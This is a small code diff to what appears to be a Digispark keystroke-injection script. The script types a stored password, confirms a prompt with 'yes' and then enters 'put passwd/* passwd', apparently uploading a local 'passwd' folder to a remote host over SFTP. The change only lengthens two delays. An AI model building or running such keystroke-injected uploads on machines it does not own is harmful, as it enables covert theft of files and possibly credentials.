@@ -56,9 +56,9 @@ void loop() {
   DigiKeyboard.print(password);
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(5000);
   DigiKeyboard.print("yes");
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("put passwd/* passwd");
